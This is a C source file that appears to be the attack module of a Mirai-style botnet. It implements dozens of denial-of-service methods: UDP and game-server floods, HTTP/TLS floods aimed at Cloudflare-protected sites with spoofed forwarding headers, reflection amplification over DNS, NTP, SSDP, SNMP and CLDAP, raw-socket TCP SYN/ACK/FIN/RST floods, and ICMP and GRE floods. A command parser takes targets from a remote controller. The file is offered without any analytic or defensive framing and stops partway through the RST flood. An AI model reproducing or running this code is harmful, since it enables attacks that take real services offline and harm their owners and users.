#include "includes.h"
#include "attack.h"
#include "protocol.h"
#include "rand.h"
#include "table.h"
#include "resolv.h"
#include "checksum.h"
#include "util.h"

#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <fcntl.h>

static struct attack_method methods[ATK_VEC_MAX];
static int methods_len = 0;
static volatile BOOL attack_ongoing[ATTACK_CONCURRENT_MAX] = {0};

void attack_init(void) {
    int i = 0;

    methods[i].func = attack_udp_flood;         methods[i++].type = ATK_VEC_UDP;
    methods[i].func = attack_game_flood;        methods[i++].type = ATK_VEC_GAME;
    methods[i].func = attack_discord_flood;     methods[i++].type = ATK_VEC_DISCORD;
    methods[i].func = attack_pps_flood;         methods[i++].type = ATK_VEC_PPS;

    methods[i].func = attack_tls_flood;         methods[i++].type = ATK_VEC_TLS;
    methods[i].func = attack_tlsplus_flood;     methods[i++].type = ATK_VEC_TLSPLUS;
    methods[i].func = attack_cf_flood;          methods[i++].type = ATK_VEC_CF;

    methods[i].func = attack_axis_l7;           methods[i++].type = ATK_VEC_AXISL7;

    methods[i].func = attack_dns_amp;           methods[i++].type = ATK_VEC_DNS_AMP;
    methods[i].func = attack_ntp_amp;           methods[i++].type = ATK_VEC_NTP_AMP;
    methods[i].func = attack_ssdp_amp;          methods[i++].type = ATK_VEC_SSDP_AMP;
    methods[i].func = attack_snmp_amp;          methods[i++].type = ATK_VEC_SNMP_AMP;
    methods[i].func = attack_cldap_amp;         methods[i++].type = ATK_VEC_CLDAP_AMP;

    /* Layer 4 TCP Methods */
    methods[i].func = attack_syn_flood;         methods[i++].type = ATK_VEC_SYN;
    methods[i].func = attack_ack_flood;         methods[i++].type = ATK_VEC_ACK;
    methods[i].func = attack_fin_flood;         methods[i++].type = ATK_VEC_FIN;
    methods[i].func = attack_rst_flood;         methods[i++].type = ATK_VEC_RST;
    methods[i].func = attack_tcpconn_flood;     methods[i++].type = ATK_VEC_TCPCONN;
    methods[i].func = attack_xmas_flood;        methods[i++].type = ATK_VEC_XMAS;
    methods[i].func = attack_null_flood;        methods[i++].type = ATK_VEC_NULL;
    methods[i].func = attack_window_flood;      methods[i++].type = ATK_VEC_WINDOW;

    /* Special Methods */
    methods[i].func = attack_icmp_flood;        methods[i++].type = ATK_VEC_ICMP;
    methods[i].func = attack_greip_flood;       methods[i++].type = ATK_VEC_GREIP;
    methods[i].func = attack_greeth_flood;      methods[i++].type = ATK_VEC_GREETH;

    methods_len = i;
}

void attack_kill_all(void) {
    for (int i = 0; i < ATTACK_CONCURRENT_MAX; i++)
        attack_ongoing[i] = FALSE;
}

void attack_parse(char *buf, int len) {
    if (len < 5) return;

    uint8_t attack_id = buf[0];
    uint8_t targs_len = buf[1];
    if (targs_len == 0) return;

    struct attack_target targs[ATTACK_MAX_TARGETS];
    for (int i = 0; i < targs_len; i++) {
        targs[i].addr.s_addr = *((ipv4_t *)(buf + 2 + (i * 4)));
        targs[i].netmask = 32;
    }

    uint8_t opts_len = buf[2 + (targs_len * 4)];
    struct attack_option opts[ATTACK_MAX_OPTIONS];
    for (int i = 0; i < opts_len; i++) {
        opts[i].key = buf[3 + (targs_len * 4) + (i * 2)];
        opts[i].val = (char *)&buf[3 + (targs_len * 4) + (i * 2) + 1];
    }

    attack_start(-1, attack_id, targs_len, targs, opts);
}

void attack_start(int fd, uint8_t attack_id, int targs_len, struct attack_target *targs, struct attack_option *opts) {
    for (int i = 0; i < methods_len; i++) {
        if (methods[i].type == attack_id) {
            attack_ongoing[0] = TRUE;
            methods[i].func(0, 32, targs, targs_len, opts, 0);
            attack_ongoing[0] = FALSE;
            break;
        }
    }
}

char *attack_get_opt_str(int targs_len, struct attack_option *opts, int opts_len, uint8_t key) {
    for (int i = 0; i < opts_len; i++)
        if (opts[i].key == key)
            return opts[i].val;
    return NULL;
}

int attack_get_opt_int(int targs_len, struct attack_option *opts, int opts_len, uint8_t key) {
    char *val = attack_get_opt_str(targs_len, opts, opts_len, key);
    return val ? util_atoi(val) : 0;
}

static inline void rand_str_safe(char *str, int len) {
    static char alphanum[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    for (int i = 0; i < len; i++)
        str[i] = alphanum[rand_next() % (sizeof(alphanum) - 1)];
}

void attack_udp_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                      int targs_len, struct attack_option *opts, int opts_len) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) return;

    uint16_t dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = rand_next() % 0xFFFF;

    uint16_t payload_size = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_PAYLOAD_SIZE);
    if (payload_size == 0) payload_size = 1472;

    char *payload = malloc(payload_size);
    if (!payload) { close(fd); return; }

    struct sockaddr_in sin = {0};
    sin.sin_family = AF_INET;
    sin.sin_port = htons(dport);

    for (int i = 0; i < targs_len; i++) {
        sin.sin_addr.s_addr = targs[i].addr.s_addr;
        while (attack_ongoing[0]) {
            rand_str_safe(payload, payload_size);
            sendto(fd, payload, payload_size, 0, (struct sockaddr *)&sin, sizeof(sin));
        }
    }

    free(payload);
    close(fd);
}

void attack_game_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                       int targs_len, struct attack_option *opts, int opts_len) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) return;

    uint16_t dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = 27015 + (rand_next() % 100);

    uint16_t payload_size = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_PAYLOAD_SIZE);
    if (payload_size == 0) payload_size = 1472;

    char *payload = malloc(payload_size);
    if (!payload) { close(fd); return; }

    struct sockaddr_in sin = {0};
    sin.sin_family = AF_INET;
    sin.sin_port = htons(dport);

    for (int i = 0; i < targs_len; i++) {
        sin.sin_addr.s_addr = targs[i].addr.s_addr;
        while (attack_ongoing[0]) {
            rand_str_safe(payload, payload_size);
            sendto(fd, payload, payload_size, 0, (struct sockaddr *)&sin, sizeof(sin));
        }
    }

    free(payload);
    close(fd);
}

void attack_discord_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                          int targs_len, struct attack_option *opts, int opts_len) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) return;

    uint16_t dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = 50000 + (rand_next() % 1000);

    char payload[1472];
    struct sockaddr_in sin = {0};
    sin.sin_family = AF_INET;
    sin.sin_port = htons(dport);

    for (int i = 0; i < targs_len; i++) {
        sin.sin_addr.s_addr = targs[i].addr.s_addr;
        while (attack_ongoing[0]) {
            rand_str_safe(payload, sizeof(payload));
            sendto(fd, payload, sizeof(payload), 0, (struct sockaddr *)&sin, sizeof(sin));
        }
    }

    close(fd);
}

void attack_pps_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                      int targs_len, struct attack_option *opts, int opts_len) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) return;

    uint16_t dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = rand_next() % 0xFFFF;

    struct sockaddr_in sin = {0};
    sin.sin_family = AF_INET;
    sin.sin_port = htons(dport);

    for (int i = 0; i < targs_len; i++) {
        sin.sin_addr.s_addr = targs[i].addr.s_addr;
        while (attack_ongoing[0]) {
            for (int j = 0; j < 10000; j++)
                sendto(fd, "x", 1, 0, (struct sockaddr *)&sin, sizeof(sin));
        }
    }

    close(fd);
}

void attack_tls_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                      int targs_len, struct attack_option *opts, int opts_len) {
    char *domain = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_DOMAIN);
    char *path = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_HTTP_PATH);
    char *ua = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_USERAGENT);

    if (!domain) domain = "target.com";
    if (!path) path = "/";
    if (!ua) ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";

    char req[1024];
    int req_len = snprintf(req, sizeof(req),
        "GET %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: %s\r\n"
        "Accept: */*\r\n"
        "Connection: keep-alive\r\n\r\n",
        path, domain, ua);

    uint16_t dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = 443;

    struct sockaddr_in sin = {0};
    sin.sin_family = AF_INET;
    sin.sin_port = htons(dport);

    for (int i = 0; i < targs_len; i++) {
        sin.sin_addr.s_addr = targs[i].addr.s_addr;
        while (attack_ongoing[0]) {
            int fd = socket(AF_INET, SOCK_STREAM, 0);
            if (fd == -1) continue;
            fcntl(fd, F_SETFL, O_NONBLOCK);
            connect(fd, (struct sockaddr *)&sin, sizeof(sin));
            send(fd, req, req_len, MSG_NOSIGNAL);
            usleep(1000);
            close(fd);
        }
    }
}

void attack_tlsplus_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                          int targs_len, struct attack_option *opts, int opts_len) {
    char *domain = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_DOMAIN);
    char *path = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_HTTP_PATH);

    if (!domain) domain = "target.com";
    if (!path) path = "/";

    static const char *user_agents[] = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15"
    };

    char req[2048];
    struct sockaddr_in sin = {0};
    sin.sin_family = AF_INET;
    sin.sin_port = htons(443);

    for (int i = 0; i < targs_len; i++) {
        sin.sin_addr.s_addr = targs[i].addr.s_addr;
        while (attack_ongoing[0]) {
            const char *ua = user_agents[rand_next() % 4];
            int req_len = snprintf(req, sizeof(req),
                "GET %s HTTP/1.1\r\n"
                "Host: %s\r\n"
                "User-Agent: %s\r\n"
                "Accept: text/html,application/xhtml+xml\r\n"
                "Accept-Language: en-US,en;q=0.9\r\n"
                "Accept-Encoding: gzip, deflate\r\n"
                "Connection: keep-alive\r\n"
                "Upgrade-Insecure-Requests: 1\r\n\r\n",
                path, domain, ua);

            int fd = socket(AF_INET, SOCK_STREAM, 0);
            if (fd == -1) continue;
            fcntl(fd, F_SETFL, O_NONBLOCK);
            connect(fd, (struct sockaddr *)&sin, sizeof(sin));
            send(fd, req, req_len, MSG_NOSIGNAL);
            usleep(500);
            close(fd);
        }
    }
}

void attack_cf_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                     int targs_len, struct attack_option *opts, int opts_len) {
    attack_tlsplus_flood(addr, targs_netmask, targs, targs_len, opts, opts_len);
}

static char *l7_user_agents[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    NULL
};

static void generate_residential_ip(char *buf) {
    snprintf(buf, 16, "%d.%d.%d.%d",
        24 + (rand_next() % 30),
        rand_next() % 256,
        rand_next() % 256,
        1 + (rand_next() % 254));
}
void attack_axis_l7(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                    int targs_len, struct attack_option *opts, int opts_len) {
    char *domain = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_DOMAIN);
    char *path = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_HTTP_PATH);
    char *cookies = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_COOKIES);

    if (!domain) domain = "target.com";
    if (!path) path = "/";

    static const char *http_methods[] = {"GET", "GET", "GET", "HEAD", "POST"};
    char req[4096];
    char residential_ip[16];
    generate_residential_ip(residential_ip);

    for (int i = 0; i < targs_len; i++) {
        while (attack_ongoing[0]) {
            const char *method = http_methods[rand_next() % 5];
            const char *ua = l7_user_agents[rand_next() % 4];

            int req_len = snprintf(req, sizeof(req),
                "%s %s HTTP/1.1\r\n"
                "Host: %s\r\n"
                "User-Agent: %s\r\n"
                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                "Accept-Language: en-US,en;q=0.9\r\n"
                "Accept-Encoding: gzip, deflate\r\n"
                "Connection: keep-alive\r\n"
                "Sec-Fetch-Dest: document\r\n"
                "Sec-Fetch-Mode: navigate\r\n"
                "X-Forwarded-For: %s\r\n"
                "X-Real-IP: %s\r\n"
                "%s%s\r\n",
                method, path, domain, ua,
                residential_ip, residential_ip,
                cookies ? "Cookie: " : "", cookies ? cookies : "");

            int fd = socket(AF_INET, SOCK_STREAM, 0);
            if (fd != -1) {
                struct sockaddr_in sin = {0};
                sin.sin_family = AF_INET;
                sin.sin_port = htons(443);
                sin.sin_addr.s_addr = targs[i].addr.s_addr;
                fcntl(fd, F_SETFL, O_NONBLOCK);
                connect(fd, (struct sockaddr *)&sin, sizeof(sin));
                send(fd, req, req_len, MSG_NOSIGNAL);
                usleep(200);
                close(fd);
            }
        }
    }
}

void attack_dns_amp(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                    int targs_len, struct attack_option *opts, int opts_len) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) return;

    uint16_t dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = 53;

    char dns_query[32] = {
        0x00, 0x00, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x01, 0x01, 0x00, 0x00
    };

    struct sockaddr_in sin = {0};
    sin.sin_family = AF_INET;
    sin.sin_port = htons(dport);

    for (int i = 0; i < targs_len; i++) {
        sin.sin_addr.s_addr = targs[i].addr.s_addr;
        while (attack_ongoing[0]) {
            dns_query[0] = (rand_next() >> 8) & 0xFF;
            dns_query[1] = rand_next() & 0xFF;
            sendto(fd, dns_query, sizeof(dns_query), 0, (struct sockaddr *)&sin, sizeof(sin));
        }
    }

    close(fd);
}

void attack_ntp_amp(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                    int targs_len, struct attack_option *opts, int opts_len) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) return;

    uint16_t dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = 123;

    char ntp_query[48] = {
        0x17, 0x00, 0x03, 0x2a, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    };

    struct sockaddr_in sin = {0};
    sin.sin_family = AF_INET;
    sin.sin_port = htons(dport);

    for (int i = 0; i < targs_len; i++) {
        sin.sin_addr.s_addr = targs[i].addr.s_addr;
        while (attack_ongoing[0]) {
            sendto(fd, ntp_query, sizeof(ntp_query), 0, (struct sockaddr *)&sin, sizeof(sin));
        }
    }

    close(fd);
}

void attack_ssdp_amp(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                     int targs_len, struct attack_option *opts, int opts_len) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) return;

    uint16_t dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = 1900;

    char ssdp_query[] =
        "M-SEARCH * HTTP/1.1\r\n"
        "HOST: 239.255.255.250:1900\r\n"
        "MAN: \"ssdp:discover\"\r\n"
        "MX: 3\r\n"
        "ST: ssdp:all\r\n\r\n";

    struct sockaddr_in sin = {0};
    sin.sin_family = AF_INET;
    sin.sin_port = htons(dport);

    for (int i = 0; i < targs_len; i++) {
        sin.sin_addr.s_addr = targs[i].addr.s_addr;
        while (attack_ongoing[0]) {
            sendto(fd, ssdp_query, sizeof(ssdp_query) - 1, 0, (struct sockaddr *)&sin, sizeof(sin));
        }
    }

    close(fd);
}

void attack_snmp_amp(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                     int targs_len, struct attack_option *opts, int opts_len) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) return;

    uint16_t dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = 161;

    char snmp_query[] = {
        0x30, 0x26, 0x02, 0x01, 0x01, 0x04, 0x06, 0x70,
        0x75, 0x62, 0x6c, 0x69, 0x63, 0xa0, 0x19, 0x02
    };

    struct sockaddr_in sin = {0};
    sin.sin_family = AF_INET;
    sin.sin_port = htons(dport);

    for (int i = 0; i < targs_len; i++) {
        sin.sin_addr.s_addr = targs[i].addr.s_addr;
        while (attack_ongoing[0]) {
            sendto(fd, snmp_query, sizeof(snmp_query), 0, (struct sockaddr *)&sin, sizeof(sin));
        }
    }

    close(fd);
}

void attack_cldap_amp(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                      int targs_len, struct attack_option *opts, int opts_len) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) return;

    uint16_t dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = 389;

    char cldap_query[] = {
        0x30, 0x29, 0x02, 0x01, 0x01, 0x63, 0x24, 0x04,
        0x00, 0x0a, 0x01, 0x00, 0x0a, 0x01, 0x00, 0x02
    };

    struct sockaddr_in sin = {0};
    sin.sin_family = AF_INET;
    sin.sin_port = htons(dport);

    for (int i = 0; i < targs_len; i++) {
        sin.sin_addr.s_addr = targs[i].addr.s_addr;
        while (attack_ongoing[0]) {
            sendto(fd, cldap_query, sizeof(cldap_query), 0, (struct sockaddr *)&sin, sizeof(sin));
        }
    }

    close(fd);
}

/* =========================================================================
 * Layer 4 TCP Methods (ICMP, GRE)
 * ========================================================================= */

void attack_icmp_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                       int targs_len, struct attack_option *opts, int opts_len) {
    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) return;

    uint16_t dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = 80;

    char icmp_packet[1500];
    struct iphdr *iph = (struct iphdr *)icmp_packet;
    struct icmphdr *icmph = (struct icmphdr *)(icmp_packet + sizeof(struct iphdr));

    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct icmphdr));
    iph->id = rand_next();
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = IPPROTO_ICMP;
    iph->check = 0;

    icmph->type = 8;  /* Echo request */
    icmph->code = 0;
    icmph->checksum = 0;
    icmph->un.echo.id = rand_next();
    icmph->un.echo.sequence = rand_next();

    struct sockaddr_in sin = {0};
    sin.sin_family = AF_INET;

    for (int i = 0; i < targs_len; i++) {
        sin.sin_addr.s_addr = targs[i].addr.s_addr;
        iph->saddr = LOCAL_ADDR;
        iph->daddr = sin.sin_addr.s_addr;
        iph->check = 0;
        iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

        while (attack_ongoing[0]) {
            icmph->un.echo.sequence = rand_next();
            icmph->checksum = 0;
            icmph->checksum = checksum_icmp((uint16_t *)icmph, sizeof(struct icmphdr));

            sendto(fd, icmp_packet, sizeof(struct iphdr) + sizeof(struct icmphdr), 0,
                  (struct sockaddr *)&sin, sizeof(sin));
        }
    }

    close(fd);
}

void attack_greip_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                        int targs_len, struct attack_option *opts, int opts_len) {
    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) return;

    uint16_t dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = 80;

    char gre_packet[1500];
    struct iphdr *outer_iph = (struct iphdr *)gre_packet;
    struct grehdr *gre = (struct grehdr *)(gre_packet + sizeof(struct iphdr));
    struct iphdr *inner_iph = (struct iphdr *)(gre_packet + sizeof(struct iphdr) + sizeof(struct grehdr));

    outer_iph->ihl = 5;
    outer_iph->version = 4;
    outer_iph->tos = 0;
    outer_iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct grehdr) + sizeof(struct iphdr));
    outer_iph->id = rand_next();
    outer_iph->frag_off = 0;
    outer_iph->ttl = 64;
    outer_iph->protocol = 47;  /* GRE */
    outer_iph->check = 0;

    gre->flags = 0;
    gre->protocol = htons(0x0800);  /* IPv4 */

    inner_iph->ihl = 5;
    inner_iph->version = 4;
    inner_iph->tos = 0;
    inner_iph->tot_len = htons(sizeof(struct iphdr));
    inner_iph->id = rand_next();
    inner_iph->frag_off = 0;
    inner_iph->ttl = 64;
    inner_iph->protocol = IPPROTO_UDP;
    inner_iph->check = 0;

    struct sockaddr_in sin = {0};
    sin.sin_family = AF_INET;

    for (int i = 0; i < targs_len; i++) {
        sin.sin_addr.s_addr = targs[i].addr.s_addr;
        outer_iph->saddr = LOCAL_ADDR;
        outer_iph->daddr = sin.sin_addr.s_addr;
        outer_iph->check = 0;
        outer_iph->check = checksum_generic((uint16_t *)outer_iph, sizeof(struct iphdr));

        while (attack_ongoing[0]) {
            inner_iph->saddr = rand_next();
            inner_iph->daddr = sin.sin_addr.s_addr;
            inner_iph->check = 0;
            inner_iph->check = checksum_generic((uint16_t *)inner_iph, sizeof(struct iphdr));

            sendto(fd, gre_packet, sizeof(struct iphdr) + sizeof(struct grehdr) + sizeof(struct iphdr), 0,
                  (struct sockaddr *)&sin, sizeof(sin));
        }
    }

    close(fd);
}

void attack_greeth_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                         int targs_len, struct attack_option *opts, int opts_len) {
    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) return;

    uint16_t dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = 80;

    char gre_packet[1500];
    struct iphdr *outer_iph = (struct iphdr *)gre_packet;
    struct grehdr *gre = (struct grehdr *)(gre_packet + sizeof(struct iphdr));
    struct ethhdr *eth = (struct ethhdr *)(gre_packet + sizeof(struct iphdr) + sizeof(struct grehdr));

    outer_iph->ihl = 5;
    outer_iph->version = 4;
    outer_iph->tos = 0;
    outer_iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct grehdr) + sizeof(struct ethhdr));
    outer_iph->id = rand_next();
    outer_iph->frag_off = 0;
    outer_iph->ttl = 64;
    outer_iph->protocol = 47;  /* GRE */
    outer_iph->check = 0;

    gre->flags = 0;
    gre->protocol = htons(0x6558);  /* Transparent Ethernet */

    memset(eth->h_dest, 0xFF, ETH_ALEN);  /* Broadcast */
    memset(eth->h_source, rand_next() & 0xFF, ETH_ALEN);
    eth->h_proto = htons(ETH_P_IP);

    struct sockaddr_in sin = {0};
    sin.sin_family = AF_INET;

    for (int i = 0; i < targs_len; i++) {
        sin.sin_addr.s_addr = targs[i].addr.s_addr;
        outer_iph->saddr = LOCAL_ADDR;
        outer_iph->daddr = sin.sin_addr.s_addr;
        outer_iph->check = 0;
        outer_iph->check = checksum_generic((uint16_t *)outer_iph, sizeof(struct iphdr));

        while (attack_ongoing[0]) {
            sendto(fd, gre_packet, sizeof(struct iphdr) + sizeof(struct grehdr) + sizeof(struct ethhdr), 0,
                  (struct sockaddr *)&sin, sizeof(sin));
        }
    }

    close(fd);
}

/* =========================================================================
 * Layer 4 TCP Flood Methods
 * ========================================================================= */

void attack_syn_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                      int targs_len, struct attack_option *opts, int opts_len) {
    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) return;

    uint16_t dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = 80;

    char tcp_packet[1500];
    struct iphdr *iph = (struct iphdr *)tcp_packet;
    struct tcphdr *tcph = (struct tcphdr *)(tcp_packet + sizeof(struct iphdr));

    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;

    tcph->dest = htons(dport);
    tcph->syn = TRUE;
    tcph->doff = 5;
    tcph->window = rand_next();

    struct sockaddr_in sin = {0};
    sin.sin_family = AF_INET;

    for (int i = 0; i < targs_len; i++) {
        sin.sin_addr.s_addr = targs[i].addr.s_addr;
        iph->saddr = LOCAL_ADDR;
        iph->daddr = sin.sin_addr.s_addr;
        iph->check = 0;
        iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

        while (attack_ongoing[0]) {
            tcph->source = rand_next();
            tcph->seq = rand_next();
            tcph->ack_seq = 0;
            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));
            sendto(fd, tcp_packet, sizeof(struct iphdr) + sizeof(struct tcphdr), 0,
                  (struct sockaddr *)&sin, sizeof(sin));
        }
    }
    close(fd);
}

void attack_ack_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                      int targs_len, struct attack_option *opts, int opts_len) {
    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) return;

    uint16_t dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = 80;

    char tcp_packet[1500];
    struct iphdr *iph = (struct iphdr *)tcp_packet;
    struct tcphdr *tcph = (struct tcphdr *)(tcp_packet + sizeof(struct iphdr));

    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;

    tcph->dest = htons(dport);
    tcph->ack = TRUE;
    tcph->doff = 5;
    tcph->window = rand_next();

    struct sockaddr_in sin = {0};
    sin.sin_family = AF_INET;

    for (int i = 0; i < targs_len; i++) {
        sin.sin_addr.s_addr = targs[i].addr.s_addr;
        iph->saddr = LOCAL_ADDR;
        iph->daddr = sin.sin_addr.s_addr;
        iph->check = 0;
        iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

        while (attack_ongoing[0]) {
            tcph->source = rand_next();
            tcph->seq = rand_next();
            tcph->ack_seq = rand_next();
            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));
            sendto(fd, tcp_packet, sizeof(struct iphdr) + sizeof(struct tcphdr), 0,
                  (struct sockaddr *)&sin, sizeof(sin));
        }
    }
    close(fd);
}

void attack_fin_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                      int targs_len, struct attack_option *opts, int opts_len) {
    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) return;

    uint16_t dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = 80;

    char tcp_packet[1500];
    struct iphdr *iph = (struct iphdr *)tcp_packet;
    struct tcphdr *tcph = (struct tcphdr *)(tcp_packet + sizeof(struct iphdr));

    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;

    tcph->dest = htons(dport);
    tcph->fin = TRUE;
    tcph->doff = 5;
    tcph->window = rand_next();

    struct sockaddr_in sin = {0};
    sin.sin_family = AF_INET;

    for (int i = 0; i < targs_len; i++) {
        sin.sin_addr.s_addr = targs[i].addr.s_addr;
        iph->saddr = LOCAL_ADDR;
        iph->daddr = sin.sin_addr.s_addr;
        iph->check = 0;
        iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

        while (attack_ongoing[0]) {
            tcph->source = rand_next();
            tcph->seq = rand_next();
            tcph->ack_seq = rand_next();
            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));
            sendto(fd, tcp_packet, sizeof(struct iphdr) + sizeof(struct tcphdr), 0,
                  (struct sockaddr *)&sin, sizeof(sin));
        }
    }
    close(fd);
}

void attack_rst_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                      int targs_len, struct attack_option *opts, int opts_len) {
    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) return;

    uint16_t dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = 80;

    char tcp_packet[1500];
    struct iphdr *iph = (struct iphdr *)tcp_packet;
    struct tcphdr *tcph = (struct tcphdr *)(tcp_packet + sizeof(struct iphdr));

    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;

    tcph->dest = htons(dport);
